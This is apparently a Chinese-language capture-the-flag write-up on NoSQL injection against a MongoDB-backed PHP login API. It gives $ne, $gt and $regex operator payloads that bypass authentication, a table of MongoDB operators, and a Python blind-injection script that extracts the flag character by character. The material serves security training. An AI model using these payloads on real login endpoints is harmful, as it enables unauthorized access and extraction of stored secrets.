使用工具nosqlattack。不能用sqlmap。

```
/api/?id[]=flag
```
语句
```
$query = new MongoDB\Driver\Query($data);
$cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();

将不等于1的数据都查询出来
username[$ne]=1&password[$ne]=1
$ne是不相等的意思

查询用户名不为admin的数据
username[$ne]=admin&password[$ne]=1

大于
username[$gt]=admin3&password[$ne]=1

flag在password里面直接查
username[$ne]=1&password[$regex]=^ctfshow{
```

^
| 方法名  | 描述                                                   |
| ---- | ---------------------------------------------------- |
| $gt  | 大于                                                   |
| $lte | 小于等于                                                 |
| $in  | 包含                                                   |
| $nin | 不包含                                                  |
| $lt  | 小于                                                   |
| $gte | 大于等于                                                 |
| $ne  | 不等于                                                  |
| $eq  | 等于                                                   |
| $and | 与                                                    |
| $nor | $nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档。 |
| $not | 反匹配(1.3.3及以上版本)，字段值不匹配表达式或者字段值不存在。                   |
| $or  | 或                                                    |

^
## **盲注**
```
# @author：Myon
# @time：20240913
import requests
import string
 
url = 'http://9e856a5a-0dd8-4fac-8b5a-450688cee600.challenge.ctf.show/api/'
dic = string.digits+string.ascii_lowercase+'{}-_'
out = 'ctfshow{'
 
for j in range(9,50):
    for k in dic:
        payload = {'username[$ne]':'1','password[$regex]': f'^{out+k}'}
        # print(payload)
        re = requests.post(url, data=payload)
        # print(re.text)
        if "\\u767b\\u9646\\u6210\\u529f" in re.text: # 注意反斜杠需要转义
            out += k
            break
    print(out)
```